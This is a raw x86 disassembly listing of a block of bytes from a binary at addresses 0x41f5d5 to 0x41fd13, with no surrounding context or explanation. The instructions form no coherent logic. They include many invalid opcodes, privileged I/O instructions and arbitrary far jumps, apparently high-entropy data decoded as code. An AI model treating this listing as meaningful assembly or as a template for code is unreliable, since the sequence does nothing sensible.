  41f5d5:	jle    0x41f55f
  41f5d7:	dec    ax
  41f5d9:	pop    ss
  41f5da:	popa   
  41f5db:	sub    al,0xbb
  41f5dd:	xchg   esi,eax
  41f5de:	lods   eax,DWORD PTR ds:[esi]
  41f5df:	xor    edi,DWORD PTR [esi-0x771881be]
  41f5e5:	jp     0x41f60d
  41f5e7:	pop    ebx
  41f5e8:	iret   
  41f5e9:	sbb    ah,al
  41f5eb:	loop   0x41f646
  41f5ed:	aas    
  41f5ee:	data16 lods al,BYTE PTR ds:[esi]
  41f5f0:	(bad)  
  41f5f1:	aam    0x14
  41f5f3:	inc    edx
  41f5f4:	je     0x41f624
  41f5f6:	leave  
  41f5f7:	inc    edx
  41f5f8:	ins    DWORD PTR es:[edi],dx
  41f5f9:	sbb    al,0xe7
  41f5fb:	push   esi
  41f5fc:	xchg   ecx,eax
  41f5fd:	xor    BYTE PTR [eax-0x1986fa6d],ah
  41f603:	push   esi
  41f604:	hlt    
  41f605:	xchg   edx,eax
  41f606:	jg     0x41f5b9
  41f608:	and    eax,0x4965e4ac
  41f60d:	inc    ecx
  41f60e:	std    
  41f60f:	lahf   
  41f610:	pop    es
  41f611:	stos   BYTE PTR es:[edi],al
  41f612:	das    
  41f613:	xchg   DWORD PTR [edx-0x5],esp
  41f616:	clc    
  41f617:	repnz pushf 
  41f619:	mov    esp,0x92c38b7c
  41f61e:	inc    ecx
  41f61f:	mov    ebp,eax
  41f621:	cmp    BYTE PTR [esi+esi*1],al
  41f624:	test   BYTE PTR [edx-0x579131da],ah
  41f62a:	lods   al,BYTE PTR ds:[esi]
  41f62b:	xchg   al,bl
  41f62d:	inc    esp
  41f62e:	xor    BYTE PTR [esp+ebp*4+0x2b],0x2c
  41f633:	jle    0x41f5e7
  41f635:	pop    eax
  41f636:	sbb    esp,esi
  41f638:	or     edi,DWORD PTR [eax+0x10]
  41f63b:	loop   0x41f5bf
  41f63d:	jmp    0x41c2:0x6e5dca0e
  41f644:	mov    al,BYTE PTR [ebx+0x3e]
  41f647:	pop    ds
  41f648:	cmp    BYTE PTR [ebx-0x75],ch
  41f64b:	hlt    
  41f64c:	add    dh,dh
  41f64e:	and    BYTE PTR [esi],dh
  41f650:	adc    al,BYTE PTR [ecx]
  41f652:	xor    eax,0x64f45236
  41f657:	dec    ebp
  41f658:	repnz sbb eax,0xabb4d660
  41f65e:	cmc    
  41f65f:	xor    eax,0x63911649
  41f664:	jmp    0x4fb554c1
  41f669:	dec    edx
  41f66a:	xchg   edi,eax
  41f66b:	jo     0x41f64b
  41f66d:	call   0xfb4e:0xc47d1617
  41f674:	gs and dh,0xeb
  41f678:	push   ds
  41f679:	cmp    ebx,ecx
  41f67b:	outs   dx,DWORD PTR ds:[esi]
  41f67c:	sti    
  41f67d:	mov    ds:0xe9498883,al
  41f682:	repz or eax,0x4f5e0bde
  41f688:	nop
  41f689:	repnz lds ebp,FWORD PTR [ebx-0x70]
  41f68d:	xchg   DWORD PTR [ecx],ebp
  41f68f:	cmp    BYTE PTR [ebp+0x6a],ch
  41f692:	push   0xa159656
  41f697:	mov    al,0x92
  41f699:	retf   0xd9e
  41f69c:	out    dx,eax
  41f69d:	test   eax,0x56312faa
  41f6a2:	mov    WORD PTR [edx],es
  41f6a4:	mov    edi,0xf97cfddd
  41f6a9:	pop    esp
  41f6aa:	push   eax
  41f6ab:	int3   
  41f6ac:	fnstcw WORD PTR [edx-0x288084e2]
  41f6b2:	mov    cl,0xca
  41f6b4:	es aaa 
  41f6b6:	mov    ch,0x9e
  41f6b8:	sub    al,0xc4
  41f6ba:	test   BYTE PTR [ecx-0x39],cl
  41f6bd:	push   ebx
  41f6be:	mov    edi,DWORD PTR [ecx+ecx*4+0x29]
  41f6c2:	mov    dl,0xc0
  41f6c4:	test   al,0xb1
  41f6c6:	push   0x2423d74b
  41f6cb:	cmp    eax,0xff10e8d4
  41f6d0:	call   0x216ee143
  41f6d5:	ret    0x873a
  41f6d8:	enter  0x686f,0x3f
  41f6dc:	stc    
  41f6dd:	(bad)  
  41f6df:	lahf   
  41f6e0:	in     al,dx
  41f6e1:	mov    cl,0x61
  41f6e3:	jp     0x41f6fd
  41f6e5:	cdq    
  41f6e6:	and    eax,0xf9d414ec
  41f6eb:	cld    
  41f6ec:	dec    ebp
  41f6ed:	pop    es
  41f6ee:	mov    cl,0xa2
  41f6f0:	loop   0x41f748
  41f6f2:	fwait
  41f6f3:	push   es
  41f6f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6f5:	cmp    eax,0xd2a8a194
  41f6fa:	mov    dh,dh
  41f6fc:	xchg   ecx,eax
  41f6fd:	scas   eax,DWORD PTR es:[edi]
  41f6fe:	out    dx,eax
  41f6ff:	call   0xed1c:0xef3d3a89
  41f706:	and    DWORD PTR [ebx],esi
  41f708:	xchg   ebp,eax
  41f709:	add    ch,al
  41f70b:	mov    esi,0xc9ed4b3b
  41f710:	(bad)  
  41f711:	cmp    edi,DWORD PTR [edi-0x5]
  41f714:	retf   0xe799
  41f717:	pop    es
  41f718:	and    DWORD PTR [esp+edx*1+0xa5809c],edi
  41f71f:	test   al,0x16
  41f721:	sahf   
  41f722:	and    eax,0xea302109
  41f727:	pop    ebp
  41f728:	es call 0x3b9b230
  41f72e:	test   DWORD PTR [esi],esi
  41f730:	fs jecxz 0x41f726
  41f733:	mov    al,0x68
  41f735:	scas   al,BYTE PTR es:[edi]
  41f736:	add    eax,0x9d10f9e0
  41f73b:	or     edx,esp
  41f73d:	hlt    
  41f73e:	aaa    
  41f73f:	pusha  
  41f740:	dec    ecx
  41f741:	and    BYTE PTR [ebp-0x65],ch
  41f744:	adc    BYTE PTR [edx+0x637199cb],bl
  41f74a:	jbe    0x41f783
  41f74c:	sbb    ebx,DWORD PTR [edx]
  41f74e:	sub    DWORD PTR [ebp-0x73],ebp
  41f751:	aaa    
  41f752:	mov    eax,ds:0x716bd5ff
  41f757:	je     0x41f7cf
  41f759:	push   edx
  41f75a:	or     al,0xce
  41f75c:	pop    esi
  41f75d:	pop    ebx
  41f75e:	lods   al,BYTE PTR ds:[esi]
  41f75f:	in     al,0xa7
  41f761:	ja     0x41f6fe
  41f763:	imul   esp,DWORD PTR [edi-0x76cf1389],0xffffffdb
  41f76a:	sbb    al,0x7
  41f76c:	mov    ds:0x8e7dbf20,eax
  41f771:	xor    eax,0x650c3f1a
  41f776:	fs mov ecx,0xe528b792
  41f77c:	test   eax,0xebf53f29
  41f781:	dec    ebx
  41f782:	(bad)  
  41f783:	and    cl,dh
  41f785:	cmc    
  41f786:	pushf  
  41f787:	and    al,0x48
  41f789:	in     eax,dx
  41f78a:	call   0xf2ad2b71
  41f78f:	ja     0x41f784
  41f791:	stc    
  41f792:	xchg   edi,eax
  41f793:	jnp    0x41f7d5
  41f795:	je     0x41f798
  41f797:	sbb    al,0x38
  41f799:	sbb    BYTE PTR [esi+0x19],0x8b
  41f79d:	and    eax,0xed101220
  41f7a2:	dec    ecx
  41f7a3:	mov    eax,0x602775f3
  41f7a8:	es retf 0xe84
  41f7ac:	pop    es
  41f7ad:	adc    DWORD PTR [ecx],ebp
  41f7af:	(bad)  
  41f7b0:	out    dx,al
  41f7b1:	sbb    al,0x96
  41f7b3:	(bad)  
  41f7b4:	push   ecx
  41f7b5:	push   es
  41f7b6:	ret    0xfec2
  41f7b9:	int3   
  41f7ba:	inc    esp
  41f7bb:	ret    0xfe23
  41f7be:	pop    edx
  41f7bf:	fisttp QWORD PTR [edi-0x49]
  41f7c2:	pop    ds
  41f7c3:	push   ebx
  41f7c4:	out    0x60,al
  41f7c6:	xor    al,0x27
  41f7c8:	dec    edx
  41f7c9:	outs   dx,BYTE PTR ds:[esi]
  41f7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7cb:	sti    
  41f7cc:	xchg   DWORD PTR [ebx+0x34e61f4f],ebp
  41f7d2:	pushf  
  41f7d3:	cmc    
  41f7d4:	dec    ebx
  41f7d5:	jne    0x41f80d
  41f7d7:	aad    0x77
  41f7d9:	pusha  
  41f7da:	es inc esi
  41f7dc:	inc    esi
  41f7de:	sti    
  41f7df:	test   al,0x5d
  41f7e1:	adc    DWORD PTR [ebx-0x11],ebp
  41f7e4:	sub    bl,bl
  41f7e6:	retf   0x8df6
  41f7e9:	xor    cl,bl
  41f7eb:	push   ds
  41f7ec:	loop   0x41f7fe
  41f7ee:	lods   eax,DWORD PTR ds:[esi]
  41f7ef:	in     eax,0x4d
  41f7f1:	and    eax,0xf6e3d15a
  41f7f6:	outs   dx,BYTE PTR ds:[esi]
  41f7f7:	mov    ah,0x18
  41f7f9:	ins    DWORD PTR es:[edi],dx
  41f7fa:	jb     0x41f7f5
  41f7fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7fd:	jbe    0x41f7cd
  41f7ff:	jno    0x41f7e1
  41f801:	xor    ebx,esp
  41f803:	rcr    al,0x3f
  41f806:	daa    
  41f807:	fwait
  41f808:	in     al,0x13
  41f80a:	dec    edi
  41f80b:	jg     0x41f818
  41f80d:	jo     0x41f7cf
  41f80f:	test   BYTE PTR [esi+0x3a],bl
  41f812:	xchg   DWORD PTR [edi-0x1086da12],esi
  41f818:	lds    esi,FWORD PTR [ebp+0x5b]
  41f81b:	xor    al,0x61
  41f81d:	cwde   
  41f81e:	cdq    
  41f81f:	push   edi
  41f820:	dec    ebp
  41f821:	repnz or BYTE PTR [edx-0x20d11887],cl
  41f828:	add    esp,0x3fc7fb2a
  41f82e:	sub    dh,dh
  41f830:	mov    ch,0x39
  41f832:	mov    edi,0x1dd70e58
  41f837:	and    BYTE PTR [ebp+0x1b90c69d],cl
  41f83d:	xchg   esi,eax
  41f83e:	repnz in eax,dx
  41f840:	xor    BYTE PTR [edi-0x1357521b],ch
  41f846:	arpl   WORD PTR [eax+0x1869b5fc],di
  41f84c:	push   edx
  41f84d:	cmc    
  41f84e:	mov    WORD PTR [edx-0x74],fs
  41f851:	pop    ecx
  41f852:	loope  0x41f8ad
  41f854:	fiadd  WORD PTR [edx]
  41f856:	sub    ch,BYTE PTR [esi-0x3c22edf4]
  41f85c:	push   0xbc1d6f51
  41f861:	jg     0x41f8cc
  41f863:	add    dh,BYTE PTR [ebx]
  41f865:	scas   eax,DWORD PTR es:[edi]
  41f866:	out    0x7d,al
  41f868:	cmp    ch,BYTE PTR [esi]
  41f86a:	adc    eax,0x799eb549
  41f86f:	pop    eax
  41f870:	jae    0x41f899
  41f872:	call   0x80ce:0x894da523
  41f879:	xchg   edi,eax
  41f87a:	pop    edi
  41f87b:	xor    edx,esi
  41f87d:	bnd jle 0x41f813
  41f880:	mov    al,ds:0x13b4cefe
  41f885:	int    0x3f
  41f887:	jg     0x41f835
  41f889:	stc    
  41f88a:	cmp    ah,cl
  41f88c:	pop    ecx
  41f88d:	jo     0x41f858
  41f88f:	int    0xe1
  41f891:	test   eax,0x287af1b8
  41f896:	nop
  41f897:	push   cs
  41f898:	jge    0x41f829
  41f89a:	(bad)  
  41f89b:	mov    dl,0x11
  41f89d:	jge    0x41f8b5
  41f89f:	(bad)  
  41f8a0:	les    ecx,FWORD PTR [edx+ebp*4+0x3a4b40be]
  41f8a7:	cmp    DWORD PTR [ecx+0x6926d03],0xffffffc3
  41f8ae:	outs   dx,DWORD PTR ds:[esi]
  41f8af:	push   cs
  41f8b0:	dec    esp
  41f8b1:	cmp    edi,DWORD PTR [edi+0x1c4ac9fb]
  41f8b7:	ret    
  41f8b8:	dec    eax
  41f8b9:	push   ds
  41f8ba:	sbb    al,ah
  41f8bc:	pop    edx
  41f8bd:	test   ecx,edx
  41f8bf:	push   bp
  41f8c1:	or     bl,BYTE PTR [esi-0x46]
  41f8c4:	test   BYTE PTR [ebp+0x3964f1aa],cl
  41f8ca:	and    esi,ebx
  41f8cc:	sbb    DWORD PTR [edx-0x35dbe55d],esp
  41f8d2:	fist   DWORD PTR [ecx-0x2993d03d]
  41f8d8:	ins    BYTE PTR es:[edi],dx
  41f8d9:	fldenv [edx-0x80]
  41f8dc:	cli    
  41f8dd:	nop
  41f8de:	push   cs
  41f8df:	push   ds
  41f8e0:	dec    edx
  41f8e1:	xor    al,0xe5
  41f8e3:	adc    BYTE PTR ds:[edi],dh
  41f8e6:	std    
  41f8e7:	jne    0x41f8b3
  41f8e9:	retw   0xa157
  41f8ed:	pushf  
  41f8ee:	mov    dl,dl
  41f8f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8f1:	jne    0x41f87f
  41f8f3:	popf   
  41f8f4:	cmc    
  41f8f5:	test   cl,ah
  41f8f7:	ins    BYTE PTR es:[edi],dx
  41f8f8:	mov    dl,0xb8
  41f8fa:	test   al,0x18
  41f8fc:	push   0x68
  41f8fe:	das    
  41f8ff:	or     edi,DWORD PTR [edi+edi*8]
  41f902:	mov    eax,DWORD PTR [ebx]
  41f904:	mov    BYTE PTR [edx-0x4ec0b6ca],ah
  41f90a:	retf   
  41f90b:	jg     0x41f8ee
  41f90d:	pop    esp
  41f90e:	push   0xd389aa0d
  41f913:	xchg   DWORD PTR [edx],ebp
  41f915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f916:	pop    es
  41f917:	lods   eax,DWORD PTR ds:[esi]
  41f918:	dec    edx
  41f919:	adc    eax,0x1c0ba033
  41f91e:	ja     0x41f952
  41f920:	and    ah,BYTE PTR [ecx+0x1b]
  41f923:	shl    DWORD PTR [eax-0x43fd77a],0x1f
  41f92a:	dec    edi
  41f92b:	jbe    0x41f8c0
  41f92d:	mov    edx,0x667d2675
  41f932:	out    dx,al
  41f933:	lds    edi,FWORD PTR [edi+edi*2-0x12d0910d]
  41f93a:	in     al,dx
  41f93b:	push   edx
  41f93c:	in     eax,0x1a
  41f93e:	mov    ebp,0x25446410
  41f943:	(bad)  [edi*8+0x216ca192]
  41f94a:	pop    ss
  41f94b:	rep ins BYTE PTR es:[edi],dx
  41f94d:	jmp    0xaed5:0x2c776f47
  41f954:	push   0xffffffdc
  41f956:	push   ss
  41f957:	or     ah,BYTE PTR [esp+esi*2]
  41f95a:	sub    eax,0x34e6e208
  41f95f:	or     eax,0x5ce8ab15
  41f964:	add    al,0x33
  41f966:	into   
  41f967:	nop
  41f968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f969:	cmp    eax,0x38595ae6
  41f96e:	inc    esp
  41f96f:	pop    eax
  41f970:	mov    ch,0xf3
  41f972:	xchg   edi,esp
  41f974:	jb     0x41f94e
  41f976:	fs ret 
  41f978:	(bad)  
  41f979:	pop    edi
  41f97a:	out    0xcc,eax
  41f97c:	pop    esi
  41f97d:	push   es
  41f97e:	xchg   esi,eax
  41f97f:	inc    DWORD PTR [esi-0x6d426500]
  41f985:	xor    BYTE PTR [eax],dl
  41f987:	jg     0x41f983
  41f989:	mov    WORD PTR [edx+0x6c],?
  41f98c:	add    al,0x90
  41f98e:	stc    
  41f98f:	(bad)  
  41f990:	xchg   edi,eax
  41f991:	push   ds
  41f992:	out    dx,al
  41f993:	jne    0x41f97d
  41f995:	pop    ds
  41f996:	scas   eax,DWORD PTR es:[edi]
  41f997:	ret    
  41f998:	iret   
  41f999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f99a:	cld    
  41f99b:	shr    BYTE PTR [ebp+0x0],cl
  41f99e:	or     eax,DWORD PTR [ebx]
  41f9a0:	mov    ds:0x9aa7d171,al
  41f9a5:	ja     0x41f95a
  41f9a7:	fisub  WORD PTR [edi-0x6b879f04]
  41f9ad:	inc    ecx
  41f9ae:	iret   
  41f9af:	rcl    BYTE PTR [ebx-0x3f4cd254],0x6e
  41f9b6:	xchg   ebp,eax
  41f9b7:	adc    al,0xf6
  41f9b9:	ret    
  41f9ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9bb:	int    0x3e
  41f9bd:	sub    eax,0x9528529b
  41f9c2:	mov    gs,WORD PTR [ebp+0x16]
  41f9c5:	into   
  41f9c6:	jnp    0x41fa33
  41f9c8:	adc    eax,0x66bf0cc4
  41f9cd:	and    BYTE PTR ds:0x66cf2576,0xb1
  41f9d4:	inc    edi
  41f9d5:	cmp    dh,BYTE PTR [ecx+0x1cf54224]
  41f9db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9dc:	add    ebp,ebx
  41f9de:	inc    ebx
  41f9df:	xor    al,al
  41f9e1:	cmp    al,0x35
  41f9e3:	iret   
  41f9e4:	daa    
  41f9e5:	add    BYTE PTR [esi-0x66195e2c],0x45
  41f9ec:	call   0x8a9ebbb1
  41f9f1:	and    DWORD PTR [edi],ebx
  41f9f3:	mov    eax,0x74cbe533
  41f9f8:	add    eax,eax
  41f9fa:	retf   0x72f9
  41f9fd:	sub    bh,BYTE PTR [ecx]
  41f9ff:	ins    BYTE PTR es:[edi],dx
  41fa00:	js     0x41fa4b
  41fa02:	xchg   edx,eax
  41fa03:	cmp    ebp,edi
  41fa05:	frstor [ecx+0x44]
  41fa08:	retf   0xc0ac
  41fa0b:	shl    DWORD PTR [ebx],cl
  41fa0d:	adc    ecx,DWORD PTR fs:[esi]
  41fa10:	rol    DWORD PTR [esi-0x4f],1
  41fa13:	jge    0x41fa22
  41fa15:	jg     0x41f9ce
  41fa17:	test   DWORD PTR [ecx],esp
  41fa19:	mov    dl,0xb0
  41fa1b:	push   es
  41fa1c:	data16 sub dh,cl
  41fa1f:	fwait
  41fa20:	icebp  
  41fa21:	jne    0x41fa24
  41fa23:	outs   dx,DWORD PTR ds:[esi]
  41fa24:	shl    DWORD PTR [ebp+0x46b447e8],0x52
  41fa2b:	cdq    
  41fa2c:	cmp    DWORD PTR [edx-0x41],0xffffffa5
  41fa30:	dec    ebx
  41fa31:	shr    BYTE PTR [esi],0x60
  41fa34:	ds inc edi
  41fa36:	sbb    DWORD PTR [edi],esp
  41fa38:	in     al,dx
  41fa39:	push   edx
  41fa3a:	data16 fisub WORD PTR [eax+0x46]
  41fa3e:	adc    edi,DWORD PTR [edi]
  41fa40:	and    DWORD PTR [eax-0x23],ecx
  41fa43:	popa   
  41fa44:	clc    
  41fa45:	xlat   BYTE PTR ds:[ebx]
  41fa46:	in     eax,dx
  41fa47:	out    0xf8,eax
  41fa49:	ins    DWORD PTR es:[edi],dx
  41fa4a:	adc    DWORD PTR [eax-0x59],edx
  41fa4d:	out    0x7e,al
  41fa4f:	stc    
  41fa50:	jp     0x41fa88
  41fa52:	mov    bl,0x37
  41fa54:	or     DWORD PTR [ebx+ebp*2],ecx
  41fa57:	out    0x67,al
  41fa59:	popa   
  41fa5a:	jl     0x41fa3b
  41fa5c:	jns    0x41fadb
  41fa5e:	jo     0x41fa43
  41fa60:	sub    al,0xbc
  41fa62:	or     ecx,DWORD PTR [ebx+edx*8+0x71]
  41fa66:	fsubr  DWORD PTR [edx]
  41fa68:	xchg   esi,eax
  41fa69:	gs pop ss
  41fa6b:	fist   WORD PTR [ebx-0x21c823ee]
  41fa71:	std    
  41fa72:	into   
  41fa73:	mov    dh,BYTE PTR [edx]
  41fa75:	push   edi
  41fa76:	outs   dx,BYTE PTR ds:[esi]
  41fa77:	jecxz  0x41fa09
  41fa79:	(bad)  
  41fa7b:	xchg   BYTE PTR [edx+eax*8-0x75949bd7],dh
  41fa82:	mov    al,0x54
  41fa84:	cmp    al,0x74
  41fa86:	(bad)  
  41fa87:	push   esp
  41fa88:	pop    edx
  41fa89:	sbb    ah,0x15
  41fa8c:	add    bh,BYTE PTR [di-0x6f]
  41fa90:	repz out 0xef,eax
  41fa93:	push   0xffffffb2
  41fa95:	xadd   DWORD PTR [ebp-0x191849a4],edx
  41fa9c:	push   0x5b
  41fa9e:	(bad)
  41faa1:	xor    al,0x1a
  41faa3:	and    al,BYTE PTR [ebp+0x2e]
  41faa6:	jb     0x41fabf
  41faa8:	retf   
  41faa9:	mov    al,ds:0xe3b28105
  41faae:	stos   DWORD PTR es:[edi],eax
  41faaf:	leave  
  41fab0:	adc    BYTE PTR [edi+0x15],bl
  41fab3:	mov    ch,0x2f
  41fab5:	inc    esi
  41fab6:	inc    esi
  41fab7:	(bad)  
  41fab8:	cmc    
  41fab9:	inc    edi
  41faba:	push   edi
  41fabb:	xchg   ebp,eax
  41fabc:	out    dx,eax
  41fabd:	push   edi
  41fabe:	les    ecx,FWORD PTR [ecx+0x2f]
  41fac1:	push   ds
  41fac2:	icebp  
  41fac3:	add    al,0xdb
  41fac5:	inc    ebx
  41fac6:	data16 aad 0xfa
  41fac9:	jne    0x41fabe
  41facb:	dec    ebp
  41facc:	xchg   ebp,eax
  41facd:	sub    BYTE PTR [esi+0xbd511c1],bl
  41fad3:	dec    eax
  41fad4:	add    al,0xf
  41fad6:	addr16 call 0x1610ba2f
  41fadc:	mov    dh,0x8c
  41fade:	adc    al,0xc6
  41fae0:	mov    ds:0xadb1a2bb,al
  41fae5:	or     eax,0x6fa49569
  41faea:	in     al,dx
  41faeb:	(bad)  
  41faec:	adc    edi,ebx
  41faee:	sbb    al,BYTE PTR [ecx+edi*4+0x34]
  41faf2:	xor    esi,edx
  41faf4:	scas   eax,DWORD PTR es:[edi]
  41faf5:	mov    ebx,0xe0257af
  41fafa:	out    0x59,al
  41fafc:	pop    ss
  41fafd:	xor    ah,BYTE PTR [edx-0xa5c5d85]
  41fb03:	aaa    
  41fb04:	es sub eax,0x4053e2bf
  41fb0a:	ficom  WORD PTR [ebp-0x5a02b6b0]
  41fb10:	jnp    0x41faea
  41fb12:	ss cli 
  41fb14:	(bad)  
  41fb15:	mov    ch,0x65
  41fb17:	mov    al,0x93
  41fb19:	sub    eax,0xe600ddc2
  41fb1e:	adc    eax,0x8bdb27c2
  41fb23:	xchg   ebx,ecx
  41fb25:	hlt    
  41fb26:	or     DWORD PTR [ebx+0x5f],0x73c818ad
  41fb2d:	xor    BYTE PTR [eax],cl
  41fb2f:	rcl    DWORD PTR [edi-0x70371f9d],1
  41fb35:	fcmovnb st,st(0)
  41fb37:	mov    esp,db1
  41fb3a:	out    dx,eax
  41fb3b:	xor    eax,0xbb7a6ab0
  41fb40:	call   0x9663688c
  41fb45:	push   ecx
  41fb46:	fcom   QWORD PTR [eax-0x75]
  41fb49:	pop    ebx
  41fb4a:	mov    cl,0x5f
  41fb4c:	loop   0x41fb0e
  41fb4e:	stos   BYTE PTR es:[edi],al
  41fb4f:	adc    DWORD PTR [edx+0x36],ebp
  41fb52:	sub    BYTE PTR [ecx+0x35],bl
  41fb55:	sar    DWORD PTR [ebx-0x352bc3d7],cl
  41fb5b:	mov    ds:0xeb15597,al
  41fb60:	dec    ebp
  41fb61:	jb     0x41fb06
  41fb63:	fsub   QWORD PTR [edi-0x1]
  41fb66:	fcomp  QWORD PTR [eax]
  41fb68:	in     al,dx
  41fb69:	mov    BYTE PTR [ecx+edi*1],bl
  41fb6c:	lock fldcw WORD PTR [esi]
  41fb6f:	sbb    esp,DWORD PTR [ebx]
  41fb71:	xchg   esp,eax
  41fb72:	adc    eax,ecx
  41fb74:	cmp    ebx,DWORD PTR [esi+0x6b]
  41fb77:	dec    esp
  41fb78:	(bad)  
  41fb79:	xchg   ecx,eax
  41fb7a:	out    0xf7,eax
  41fb7c:	push   edx
  41fb7d:	ror    BYTE PTR [ecx],1
  41fb7f:	lds    ebx,FWORD PTR [edi]
  41fb81:	cli    
  41fb82:	les    esi,FWORD PTR [edi+0x38]
  41fb85:	xchg   esi,eax
  41fb86:	push   eax
  41fb87:	dec    edx
  41fb88:	nop
  41fb89:	cs push ss
  41fb8b:	inc    esi
  41fb8c:	ds ja  0x41fb96
  41fb8f:	aam    0x19
  41fb91:	adc    BYTE PTR [edi],0x80
  41fb94:	jl     0x41fc0c
  41fb96:	push   cs
  41fb97:	lods   al,BYTE PTR ds:[esi]
  41fb98:	das    
  41fb99:	test   eax,0x565453fd
  41fb9e:	mov    dh,0x3e
  41fba0:	push   0x7270dfb9
  41fba5:	dec    ebx
  41fba6:	mov    edi,DWORD PTR [ebx+0x3c359c9b]
  41fbac:	mov    ebp,0x257b2479
  41fbb1:	adc    DWORD PTR [eax-0x62],0x56
  41fbb5:	test   al,0xea
  41fbb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbb8:	in     eax,0x4a
  41fbba:	ret    0x1611
  41fbbd:	xchg   esp,eax
  41fbbe:	pop    edx
  41fbbf:	retf   0x4a38
  41fbc2:	mov    ebx,0x3250efa5
  41fbc7:	lds    edi,FWORD PTR [edx+0x17]
  41fbca:	push   ecx
  41fbcb:	mov    bh,al
  41fbcd:	shl    cl,cl
  41fbcf:	add    BYTE PTR [eax-0x51],bl
  41fbd2:	rcr    DWORD PTR [edx-0x3b],1
  41fbd5:	xor    eax,0x4e5765c7
  41fbda:	jge    0x41fbdc
  41fbdc:	sbb    bl,dh
  41fbde:	aam    0x40
  41fbe0:	xchg   ecx,eax
  41fbe1:	jl     0x41fb82
  41fbe3:	inc    edi
  41fbe4:	pop    ebx
  41fbe5:	fdiv   st,st(6)
  41fbe7:	jmp    0xd5408a97
  41fbec:	sbb    ah,BYTE PTR [ebx]
  41fbee:	jmp    0xb0616a2a
  41fbf3:	test   al,0xe8
  41fbf5:	mov    BYTE PTR [edx+0x45],cl
  41fbf8:	fcom   QWORD PTR ds:0x81c2dfa0
  41fbfe:	es pop ecx
  41fc00:	mov    eax,0x25c7545a
  41fc05:	jae    0x41fc7c
  41fc07:	push   eax
  41fc08:	mov    ch,0x13
  41fc0a:	lds    ebx,FWORD PTR [ebx]
  41fc0c:	cdq    
  41fc0d:	sti    
  41fc0e:	test   al,0x27
  41fc10:	(bad)
  41fc13:	sub    ecx,DWORD PTR [edx+eiz*2]
  41fc16:	push   edi
  41fc17:	(bad)
  41fc1b:	jne    0x41fc4a
  41fc1d:	cwde   
  41fc1e:	cmp    BYTE PTR [ecx],ch
  41fc20:	xchg   dl,ah
  41fc22:	cld    
  41fc23:	push   edx
  41fc24:	(bad)  
  41fc26:	das    
  41fc27:	mov    ch,0xc3
  41fc29:	shr    DWORD PTR [ebx-0x4004f42e],0x85
  41fc30:	not    dh
  41fc32:	mov    ch,0xc2
  41fc34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc35:	lea    ecx,[edi-0x6a]
  41fc38:	hlt    
  41fc39:	cli    
  41fc3a:	sbb    al,0x2c
  41fc3c:	pop    esp
  41fc3d:	dec    ecx
  41fc3e:	cmp    eax,0xca8bcaed
  41fc43:	sub    DWORD PTR [edi+edx*2],ebx
  41fc46:	in     eax,dx
  41fc47:	push   esp
  41fc48:	push   es
  41fc49:	ins    DWORD PTR es:[edi],dx
  41fc4a:	push   0x7feb78b1
  41fc4f:	dec    ecx
  41fc50:	push   ecx
  41fc51:	add    cl,BYTE PTR [edi-0x60]
  41fc54:	fiadd  WORD PTR [ebx+0x2e]
  41fc57:	inc    esi
  41fc58:	cmp    bh,dl
  41fc5a:	mov    eax,ds:0x11fa181
  41fc5f:	sub    al,0x6d
  41fc61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc62:	or     BYTE PTR [esi+0x11],dh
  41fc65:	stos   DWORD PTR es:[edi],eax
  41fc66:	adc    dh,cl
  41fc68:	adc    cl,ah
  41fc6a:	pop    ebp
  41fc6b:	push   ss
  41fc6c:	dec    ebx
  41fc6d:	add    ah,BYTE PTR [ebx]
  41fc6f:	inc    ecx
  41fc70:	jmp    0x6c35:0xd35c2774
  41fc77:	adc    cl,BYTE PTR [eax-0x155e7e17]
  41fc7d:	test   BYTE PTR [eax+0x24],bh
  41fc80:	aam    0xff
  41fc82:	and    DWORD PTR [edi+0x1f290c98],edx
  41fc88:	push   edx
  41fc89:	lods   al,BYTE PTR ds:[esi]
  41fc8a:	call   0x9822ccb0
  41fc8f:	inc    ecx
  41fc90:	sti    
  41fc91:	in     al,dx
  41fc92:	xchg   ebp,eax
  41fc94:	in     al,0x4f
  41fc96:	call   0x465b:0xb07e457d
  41fc9d:	aaa    
  41fc9e:	push   cs
  41fc9f:	cmp    bh,bh
  41fca1:	and    al,0xf0
  41fca3:	sub    eax,0x6e79227c
  41fca8:	jp     0x41fc62
  41fcaa:	xor    dh,BYTE PTR [eax]
  41fcac:	mov    ebp,0x52937f84
  41fcb1:	xchg   BYTE PTR [ebx],cl
  41fcb3:	mov    ah,0xa6
  41fcb5:	(bad)  
  41fcb6:	imul   ebp,DWORD PTR [edx+0x79426805],0xdbfb5f58
  41fcc0:	fadd   DWORD PTR [ecx+0x5adc660b]
  41fcc6:	aad    0x9c
  41fcc8:	cli    
  41fcc9:	push   DWORD PTR [ecx-0x58]
  41fccc:	loopne 0x41fcd3
  41fcce:	aaa    
  41fccf:	in     eax,0x9
  41fcd1:	shl    BYTE PTR [edx-0x6c],cl
  41fcd4:	out    0x65,al
  41fcd6:	jl     0x41fc69
  41fcd8:	xor    DWORD PTR [edx+eiz*8-0x6e],ecx
  41fcdc:	sub    eax,esp
  41fcde:	jne    0x41fd0e
  41fce0:	ins    DWORD PTR es:[edi],dx
  41fce1:	or     BYTE PTR [edx+ebx*4+0x7901bdf0],ch
  41fce8:	mov    ebx,0xe2ded365
  41fced:	repnz loopne 0x41fd50
  41fcf0:	xor    DWORD PTR [eax+edx*1-0x4429f6bb],esp
  41fcf7:	pop    ebx
  41fcf8:	and    eax,0xac6aa51d
  41fcfd:	(bad)  
  41fcfe:	std    
  41fcff:	ret    0xb5cc
  41fd02:	jo     0x41fc9f
  41fd04:	jmp    0x3670d28e
  41fd09:	mul    DWORD PTR [eax]
  41fd0b:	mov    eax,0xd3a0699a
  41fd10:	jecxz  0x41fd86
  41fd12:	dec    ebp
  41fd13:	enter  0xb1e7,0x8e
